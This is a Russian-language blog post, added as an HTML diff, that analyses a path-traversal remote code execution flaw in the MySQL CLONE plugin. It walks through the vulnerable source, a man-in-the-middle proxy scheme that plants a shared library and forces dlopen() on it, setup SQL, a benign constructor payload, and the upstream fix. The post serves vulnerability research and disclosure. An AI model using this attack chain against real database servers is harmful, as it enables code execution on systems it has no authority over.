@@ -1,0 +1,365 @@
+<!doctype html>
+
+<html lang="ru">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>rackodej/RCE в MySQL CLONE plugin</title>
+    <meta property="og:title" content="rackodej/RCE в MySQL CLONE plugin">
+    <meta name="twitter:title" content="rackodej/RCE в MySQL CLONE plugin">
+    <link rel="alternate" type="application/rss+xml" title="rackodej RSS (RU)" href="../../../ru/feed.xml">
+    <link rel="stylesheet" href="../../../src/styles.css">
+    <link rel="stylesheet" href="../../../src/prism-layer.css">
+    <link rel="stylesheet" href="https://unpkg.com/prismjs/themes/prism-okaidia.css">
+<link rel="stylesheet" href="https://unpkg.com/prismjs/plugins/command-line/prism-command-line.css">
+
+
+
+  </head>
+  <body>
+    <div class="language-switcher"><div class="lang-buttons-group right">
+          <form action="../../../ru/posts/mysql-clone-plugin-rce/" method="get" class="xp-form-inline">
+            <button type="submit"
+                    aria-pressed="true"
+                    >
+              RU
+            </button>
+          </form>
+          <form action="../../../en/posts/mysql-clone-plugin-rce/" method="get" class="xp-form-inline">
+            <button type="submit"
+                    
+                    >
+              EN
+            </button>
+          </form>
+        </div><form action="../../../ru/" method="get" class="xp-form-inline center">
+        <button type="submit">Главная</button>
+      </form>
+
+      <div class="toc-dock toc-collapsed">
+          <div class="toc-heading-row">
+            <div class="toc-heading" id="toc-title">Содержание</div>
+            <button class="toc-toggle" type="button" aria-expanded="false" aria-controls="page-toc" data-hide-label="[скрыть]" data-show-label="[показать]">[показать]</button>
+          </div>
+          <div class="toc-content" id="page-toc" aria-labelledby="toc-title">
+            <nav class="toc" >
+        <ol><li><a href="#%3E-rce-%D0%B2-mysql-clone-plugin">&gt; RCE в MySQL CLONE plugin</a></li><li><a href="#%D1%83%D1%81%D1%82%D1%80%D0%BE%D0%B9%D1%81%D1%82%D0%B2%D0%BE-clone">Устройство CLONE</a></li><li><a href="#%D1%81%D1%85%D0%B5%D0%BC%D0%B0">Схема</a></li><li><a href="#%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B8">Настройки</a></li><li><a href="#path-traversal">Path traversal</a><ol><li><a href="#ibd">IBD</a></li><li><a href="#soname">SONAME</a></li></ol></li><li><a href="#test">Test</a></li></ol>
+      </nav>
+          </div>
+        </div></div>
+
+    <main class="container"><h1 id="%3E-rce-%D0%B2-mysql-clone-plugin" tabindex="-1">&gt; RCE в MySQL CLONE plugin</h1>
+<h1 id="%D1%83%D1%81%D1%82%D1%80%D0%BE%D0%B9%D1%81%D1%82%D0%B2%D0%BE-clone" tabindex="-1">Устройство CLONE</h1>
+<pre class="language-sql"><code class="language-sql"><span class="highlight-line">CLONE INSTANCE <span class="token keyword">FROM</span> <span class="token string">'user'</span><span class="token variable">@'host'</span>:port</span>
+<span class="highlight-line">IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'password'</span></span>
+<span class="highlight-line"><span class="token punctuation">[</span><span class="token keyword">DATA</span> DIRECTORY <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> <span class="token string">'clone_dir'</span><span class="token punctuation">]</span></span>
+<span class="highlight-line"><span class="token punctuation">[</span><span class="token keyword">REQUIRE</span> <span class="token punctuation">[</span><span class="token keyword">NO</span><span class="token punctuation">]</span> SSL<span class="token punctuation">]</span><span class="token punctuation">;</span></span></code></pre>
+<p>Надобность у него такова: быстро добавить новый узел в кластер, новую реплику, создать копию. Очень полезный и нужный инструмент в арсенале DBA. Побудем немножко DBA.</p>
+<p>Сразу определимся с терминологией:</p>
+<p>- <code class="pill pill-red">Donor</code> - хост с которого сливается CLONE БД</p>
+<p>- <code class="pill pill-green">Recipient</code> – хост на котором вызывается команда CLONE</p>
+<p><img src="../../../content/posts/mysql-clone-plugin-rce/images/memehands.jpg" alt="time" class="img-center"></p>
+<h1 id="%D1%81%D1%85%D0%B5%D0%BC%D0%B0" tabindex="-1">Схема</h1>
+<p>Вот по этому сюжету будем двигаться</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant R as Recipient
+    participant P as proxy.py
+    participant D as Donor
+
+    P-&#x3E;&#x3E;P: &#x417;&#x430;&#x433;&#x440;&#x443;&#x437;&#x438;&#x442;&#x44C; &#x43B;&#x43E;&#x43A;&#x430;&#x43B;&#x44C;&#x43D;&#x44B;&#x439; evil.so, &#x432; PoC 15 656 &#x431;&#x430;&#x439;&#x442;&#x3C;br&#x3E;&#x441;&#x442;&#x430;&#x440;&#x430;&#x435;&#x43C;&#x441;&#x44F; &#x443;&#x43B;&#x43E;&#x436;&#x438;&#x442;&#x44C;&#x441;&#x44F; &#x432; &#x43E;&#x434;&#x43D;&#x443; &#x441;&#x442;&#x440;&#x430;&#x43D;&#x438;&#x446;&#x443;
+    D-&#x3E;&#x3E;D: &#x421;&#x43E;&#x437;&#x434;&#x430;&#x442;&#x44C; &#x411;&#x414; test &#x438; &#x442;&#x430;&#x431;&#x43B;&#x438;&#x446;&#x443; Z{22}, &#x432;&#x441;&#x442;&#x430;&#x432;&#x438;&#x442;&#x44C; evil.so
+    Note over D: &#x412; PoC .ibd = 128 KiB, 8 &#x441;&#x442;&#x440;&#x430;&#x43D;&#x438;&#x446; &#x43F;&#x43E; 16 KiB
+    R-&#x3E;&#x3E;P: &#x41F;&#x435;&#x440;&#x432;&#x44B;&#x439; CLONE &#x432; &#x43F;&#x430;&#x43F;&#x43A;&#x443; /tmp/clone1
+    P-&#x3E;&#x3E;D: &#x41F;&#x435;&#x440;&#x435;&#x441;&#x44B;&#x43B;&#x43A;&#x430; &#x437;&#x430;&#x43F;&#x440;&#x43E;&#x441;&#x430;
+    D-&#x3E;&#x3E;P: &#x41F;&#x443;&#x442;&#x44C; test/Z{22}.ibd &#x438; &#x441;&#x442;&#x440;&#x430;&#x43D;&#x438;&#x446;&#x44B; &#x441; ELF magic
+    P-&#x3E;&#x3E;R: &#x41F;&#x43E;&#x434;&#x43C;&#x435;&#x43D;&#x430; test/Z{22}.ibd &#x2192; ../../../../tmp/evil.so
+    Note over P: 31 &#x431;&#x430;&#x439;&#x442; &#x437;&#x430;&#x43C;&#x435;&#x43D;&#x44F;&#x44E;&#x442;&#x441;&#x44F; &#x43D;&#x430; 23 &#x431;&#x430;&#x439;&#x442;&#x430; &#x43F;&#x443;&#x442;&#x438; + 8 NUL padding
+    P-&#x3E;&#x3E;R: &#x426;&#x435;&#x43B;&#x435;&#x432;&#x43E;&#x439; &#x43F;&#x43E;&#x442;&#x43E;&#x43A; &#x2192; &#x43B;&#x43E;&#x43A;&#x430;&#x43B;&#x44C;&#x43D;&#x44B;&#x439; evil.so &#x438; &#x43D;&#x443;&#x43B;&#x438; &#x434;&#x43E; 128 KiB
+    Note over R: &#x417;&#x430;&#x43F;&#x438;&#x441;&#x430;&#x43D; /tmp/evil.so
+    Note over P: &#x41F;&#x43E;&#x432;&#x442;&#x43E;&#x440;&#x43D;&#x430;&#x44F; &#x43F;&#x43E;&#x434;&#x43C;&#x435;&#x43D;&#x430; .ibd &#x43E;&#x442;&#x43A;&#x43B;&#x44E;&#x447;&#x435;&#x43D;&#x430;
+
+    D-&#x3E;&#x3E;D: &#x423;&#x441;&#x442;&#x430;&#x43D;&#x43E;&#x432;&#x438;&#x442;&#x44C; auth_socket, &#x43D;&#x430; Recipient &#x43F;&#x43B;&#x430;&#x433;&#x438;&#x43D;&#x430; &#x43D;&#x435;&#x442;
+    R-&#x3E;&#x3E;P: &#x412;&#x442;&#x43E;&#x440;&#x43E;&#x439; CLONE &#x432; /tmp/clone2, &#x431;&#x435;&#x437; TLS
+    P-&#x3E;&#x3E;D: &#x41F;&#x435;&#x440;&#x435;&#x441;&#x44B;&#x43B;&#x43A;&#x430; &#x437;&#x430;&#x43F;&#x440;&#x43E;&#x441;&#x430;
+    D-&#x3E;&#x3E;P: COM_RES_PLUGIN_V2, auth_socket, soname auth_socket.so
+    P-&#x3E;&#x3E;R: &#x41F;&#x43E;&#x434;&#x43C;&#x435;&#x43D;&#x430; soname, auth_socket.so &#x2192; ../../../../tmp/evil.so
+    R-&#x3E;&#x3E;R: Validation &#x432;&#x44B;&#x437;&#x44B;&#x432;&#x430;&#x435;&#x442; dlopen(plugin_dir + soname)
+    Note over R: &#x43F;&#x43E;&#x441;&#x43B;&#x435; dlopen &#x432;&#x44B;&#x43F;&#x43E;&#x43B;&#x43D;&#x44F;&#x435;&#x442;&#x441;&#x44F; constructor &#x438;&#x437; evil.so
+</pre>
+<h1 id="%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B8" tabindex="-1">Настройки</h1>
+<p>Чтобы было легче принимать на <code class="pill pill-green">recipient</code> и <code class="pill pill-red">donor</code> выставляем:</p>
+<pre class="language-sql"><code class="language-sql"><span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> innodb_checksum_algorithm <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_enable_compression <span class="token operator">=</span> <span class="token keyword">OFF</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_autotune_concurrency <span class="token operator">=</span> <span class="token keyword">OFF</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_max_concurrency <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_max_data_bandwidth <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_max_network_bandwidth <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></span></code></pre>
+<div class="table-wrap center-inner">
+<table>
+<thead>
+<tr>
+<th>Настройка</th>
+<th>Эффект</th>
+<th>Зачем</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>innodb_checksum_algorithm</td>
+<td>вместо вычисляемой чексуммы записывает постоянное значение</td>
+<td>уменьшает влияние чексуммы на эксперименты с изменением передаваемого потока</td>
+</tr>
+<tr>
+<td>clone_enable_compression</td>
+<td>отключает сжатие данных</td>
+<td>прокся видит исходный clone stream и может разбирать его без дополнительного этапа работы со сжатием</td>
+</tr>
+<tr>
+<td>clone_autotune_concurrency</td>
+<td>отключает автоматическое изменение числа тредов в зависимости от пропускной способности</td>
+<td>автотюн тут не нужен</td>
+</tr>
+<tr>
+<td>clone_max_concurrency</td>
+<td>ограничивает одним тредом</td>
+<td>делает порядок метадаты более предсказуемым</td>
+</tr>
+<tr>
+<td>clone_max_data_bandwidth</td>
+<td>ограничивает скорость передачи</td>
+<td>замедляет передачу файлов, упрощая работу с пакетам, буферизацию и сопоставление метадаты с соответствующим файловым потоком</td>
+</tr>
+<tr>
+<td>clone_max_network_bandwidth</td>
+<td>ограничивает сетевую скорость</td>
+<td>даёт проксе больше времени на разбор и модификацию пакетов</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="path-traversal" tabindex="-1">Path traversal</h1>
+<h2 id="ibd" tabindex="-1">IBD</h2>
+<p>Во время операции CLONE под капотом  <code class="pill pill-green">recipient</code> происходит <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/clone/clone0desc.cc#L830">копирование</a> того что прилетело в метадате со сверкой длины и \0, вторым шагом происходит <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/clone/clone0apply.cc#L386-L405">конкатенация</a> в <code class="pill-line pill-gray">Clone_Snapshot::build_file_path()</code></p>
+<p>Дальше <code class="pill-line pill-gray">apply_file_metadata()</code> создаёт из дескриптора файловый <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/clone/clone0apply.cc#L1153">контекст</a> и инициирует <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/clone/clone0apply.cc#L1242">создание</a> файла. <code class="pill-line pill-gray">Clone_Handle::open_file()</code> забирает построенное имя и передаёт его в <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/clone/clone0clone.cc#L2269"><code class="pill-line pill-gray">os_file_create()</code></a> с <code>OS_FILE_CREATE_PATH</code>. Если директорий нет, они будут любезно созданы в <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/storage/innobase/os/os0file.cc#L1861"><code class="pill-line pill-gray">os_file_create_subdirs_if_needed()</code></a></p>
+<p>Source to sink:</p>
+<p>Получается source-to-sink:</p>
+<ul>
+<li>CLONE_DESC_FILE_METADATA.m_file_name</li>
+<li>→ <code class="pill-line pill-gray">deserialize()</code></li>
+<li>→ <code class="pill-line pill-gray">build_file_path(data_dir, file_meta)</code></li>
+<li>→ Clone_file_ctx</li>
+<li>→ <code class="pill-line pill-gray">open_file()</code></li>
+<li>→ <code class="pill-line pill-gray">os_file_create(..., OS_FILE_CREATE_PATH, ...)</code></li>
+</ul>
+<p>Итак первая любопытная находка, что <code>clone_dir</code> никак не связан с <code>secure_file_priv</code>, но обязательно должна либо не существовать, либо быть пустой. Так что вариант с дописыванием в какой-то <code>/home</code> отпадает. Ок! Это становится первым примитивом – произвольная запись куда может процесс mysql.</p>
+<h2 id="soname" tabindex="-1">SONAME</h2>
+<p>Вторая находка, что если на <code class="pill pill-red">donor</code> <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_server.cc#L451-L520">есть</a> какой-то плагин, он <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_server.cc#L405-L449">передаётся</a> в <code>COM_RES_PLUGIN_V2</code> в такой структуре:</p>
+<pre class="language-c"><code class="language-c"><span class="highlight-line">u8    response_command</span>
+<span class="highlight-line">u32le key_length</span>
+<span class="highlight-line">u8<span class="token punctuation">[</span><span class="token punctuation">]</span>  key</span>
+<span class="highlight-line">u32le value_length</span>
+<span class="highlight-line">u8<span class="token punctuation">[</span><span class="token punctuation">]</span>  value</span></code></pre>
+<p><code class="pill-line pill-gray">key</code> – имя плагина, <code class="pill-line pill-gray">value</code> — его soname</p>
+<p>В <code class="pill-line pill-gray">Client::handle_response()</code> на <code class="pill pill-green">recipient</code> снимает command byte и <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_client.cc#L1500">передаёт</a> в <code class="pill-line pill-gray">add_plugin_with_so()</code>.</p>
+<p><a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_client.cc#L1085"><code class="pill-line pill-gray">extract_string()</code></a> и <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_client.cc#L1114-L1130"><code class="pill-line pill-gray">extract_key_value()</code></a> корректно контролируют границы и читают обе <code>u32le</code> длины, после чего пара попадает в <code>m_plugins_with_so</code>.</p>
+<p>Пока всё выглядит хорошо, всё memory safe.</p>
+<p>Дальше <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_client.cc#L1031-L1083"><code class="pill-line pill-gray">validate_remote_params()</code></a> перебирает <code class="pill pill-red">donor</code> плагины. Если плагин уже установлен на <code class="pill pill-green">recipient</code>, ветка заканчивается. Если нет, <code>soname</code> передаётся в <code class="pill-line pill-gray">plugin_is_loadable()</code>.</p>
+<p>А <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_client.cc#L1003-L1017"><code class="pill-line pill-gray">plugin_is_loadable()</code></a> делает буквально следующее:</p>
+<pre class="language-c"><code class="language-c"><span class="highlight-line">bool Client<span class="token operator">::</span><span class="token function">plugin_is_loadable</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">&amp;</span>so_name<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">  Key_Values configs <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token string">"plugin_dir"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token keyword">auto</span> err <span class="token operator">=</span></span>
+<span class="highlight-line">      mysql_service_clone_protocol<span class="token operator">-></span><span class="token function">mysql_clone_get_configs</span><span class="token punctuation">(</span><span class="token function">get_thd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configs<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">    <span class="token keyword">return</span> false<span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token punctuation">}</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  std<span class="token operator">::</span>string <span class="token function">path</span><span class="token punctuation">(</span>configs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>second<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  path<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  path<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>so_name<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  <span class="token keyword">return</span> <span class="token function">clone_os_test_load</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
+<p><a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/plugin/clone/src/clone_os.cc#L337-L348"><code class="pill-line pill-gray">clone_os_test_load()</code></a> вызывает:</p>
+<pre class="language-cpp"><code class="language-cpp"><span class="highlight-line"><span class="token keyword">bool</span> <span class="token function">clone_os_test_load</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string <span class="token operator">&amp;</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">  <span class="token keyword">char</span> dlpath<span class="token punctuation">[</span>FN_REFLEN<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  <span class="token function">unpack_filename</span><span class="token punctuation">(</span>dlpath<span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token keyword">auto</span> handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span>dlpath<span class="token punctuation">,</span> RTLD_NOW<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token punctuation">}</span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line">  <span class="token function">dlclose</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
+<p>Вот это второй любопытный момент, то есть само тело плагина не передаётся, а передаётся его имя (soname) и локально уже ищется и подгружается. Это становится вторым примитивом – <code class="pill-line pill-gray">dlopen()</code> по любому пути</p>
+<p>В результате имеем два флоу:</p>
+<ul>
+<li>Через path traversal и подмену ibd льём свой ELF, остатки добиваем \0</li>
+<li>Через повторный path traversal, но уже в имени заранее несуществующего плагина выполняем <code class="pill-line pill-gray">dlopen()</code></li>
+</ul>
+<p>Почему бы сразу не воспользоваться штатным plugin loader? Да потому что там <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/sql/sql_plugin.cc#L560-L577">всё хорошо</a> с проверкой границ:</p>
+<pre class="language-c"><code class="language-c"><span class="token comment">/**
+<span class="highlight-line">   Check if the provided path is valid in the sense that it does cause</span>
+<span class="highlight-line">   a relative reference outside the directory.</span>
+<span class="highlight-line"></span>
+<span class="highlight-line">   @note Currently, this function only check if there are any</span>
+<span class="highlight-line">   characters in FN_DIRSEP in the string, but it might change in the</span>
+<span class="highlight-line">   future.</span>
+<span class="highlight-line"></span>
+<span class="highlight-line">   @code</span>
+<span class="highlight-line">   check_valid_path("../foo.so") -> true</span>
+<span class="highlight-line">   check_valid_path("foo.so") -> false</span>
+<span class="highlight-line">   @endcode</span>
+ */</span>
+<span class="highlight-line">bool <span class="token function">check_valid_path</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">  <span class="token class-name">size_t</span> prefix <span class="token operator">=</span> <span class="token function">my_strcspn</span><span class="token punctuation">(</span>files_charset_info<span class="token punctuation">,</span> path<span class="token punctuation">,</span> path <span class="token operator">+</span> len<span class="token punctuation">,</span> FN_DIRSEP<span class="token punctuation">,</span></span>
+<span class="highlight-line">                             <span class="token function">strlen</span><span class="token punctuation">(</span>FN_DIRSEP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token keyword">return</span> prefix <span class="token operator">&lt;</span> len<span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
+<p>Так же как и у <a href="https://github.com/facebook/mysql-5.6/blob/fb-mysql-8.0.32/sql/sql_udf.cc#L633">UDF</a></p>
+<blockquote>
+<p>No paths allowed for shared library</p>
+</blockquote>
+<p>Вот так это <a href="https://github.com/mysql/mysql-server/blob/mysql-8.4.11/plugin/clone/src/clone_client.cc#L1014">исправили</a> после патча:</p>
+<pre class="language-c"><code class="language-c"><span class="highlight-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_valid_path</span><span class="token punctuation">(</span>so_name<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> so_name<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">    <span class="token keyword">return</span> false<span class="token punctuation">;</span></span>
+<span class="highlight-line">  <span class="token punctuation">}</span></span></code></pre>
+<h1 id="test" tabindex="-1">Test</h1>
+<p>На <code class="pill pill-green">recipient</code></p>
+<pre class="language-sql"><code class="language-sql"><span class="highlight-line">INSTALL PLUGIN clone <span class="token keyword">SONAME</span> <span class="token string">'mysql_clone.so'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> clone_valid_donor_list <span class="token operator">=</span> <span class="token string">'donor:3309'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'ca'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'p'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">GRANT</span> CLONE_ADMIN <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ca'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">GRANT</span> BACKUP_ADMIN <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ca'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></span></code></pre>
+<p>На <code class="pill pill-red">donor</code></p>
+<pre class="language-sql"><code class="language-sql"><span class="highlight-line"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'clone_user'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'clone_pass'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token keyword">GRANT</span> BACKUP_ADMIN <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'clone_user'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">INSTALL PLUGIN auth_socket <span class="token keyword">SONAME</span> <span class="token string">'auth_socket.so'</span><span class="token punctuation">;</span> <span class="token comment">-- плагин который не установлен на recipient</span></span>
+<span class="highlight-line"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> ZZZZZZZZZZZZZZZZZZZZZZ <span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token keyword">LONGBLOB</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span><span class="token punctuation">;</span></span></code></pre>
+<p>Запускаем MITM <a href="../../../content/posts/mysql-clone-plugin-rce/files/mysql_clone/proxy.py">proxy.py</a> перед <code class="pill pill-red">donor</code> на порту 3309</p>
+<p>На <code class="pill pill-green">recipient</code></p>
+<pre class="language-sql"><code class="language-sql"><span class="highlight-line">CLONE INSTANCE <span class="token keyword">FROM</span> <span class="token string">'clone_user'</span><span class="token variable">@'${PROXY_IP}'</span>:<span class="token number">3309</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'clone_pass'</span> <span class="token keyword">DATA</span> DIRECTORY <span class="token operator">=</span> <span class="token string">'/tmp/clone1'</span> <span class="token keyword">REQUIRE</span> <span class="token keyword">NO</span> SSL<span class="token punctuation">;</span></span></code></pre>
+<p>В первый проход проиходит патчинг ibd <code>(6)</code> со <a href="#%D1%81%D1%85%D0%B5%D0%BC%D0%B0">схемы</a></p>
+<p>Запускаем эту же команду снова, но с другим каталогом, например /tmp/clone2</p>
+<p>В этот раз proxy переходит в режим патчинга COM_RES_PLUGIN_V2 <code>(12)</code>, и на <code class="pill pill-green">recipient</code> выполняется <code class="pill-line pill-gray">dlopen()</code> -&gt; constructor -&gt; RCE</p>
+<p>Пример тестового ELF:</p>
+<pre class="language-c"><code class="language-c"><span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></span>
+<span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span></span>
+<span class="highlight-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span></span>
+<span class="highlight-line"></span>
+<span class="highlight-line"><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
+<span class="highlight-line"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
+<span class="highlight-line">    FILE <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/clone_pwned"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>f<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">    <span class="token function">fprintf</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">"=== CLONE PATH TRAVERSAL RCE ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">    <span class="token function">fprintf</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">"PID:  %d\nUID:  %d\nEUID: %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line">    <span class="token function">fclose</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
+<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
+<blockquote>
+<p>Материал опубликован исключительно в образовательных и ознакомительных целях. Проверяйте описанные техники только на собственных системах или при наличии разрешения их владельца.</p>
+</blockquote>
+
+    </main>
+
+    <footer class="site-footer"></footer>
+    <script defer src="../../../src/copy.js"></script>
+    <script defer src="../../../src/ln-gaps.js"></script>
+    <script defer src="../../../src/asciinema-loader.js"></script>
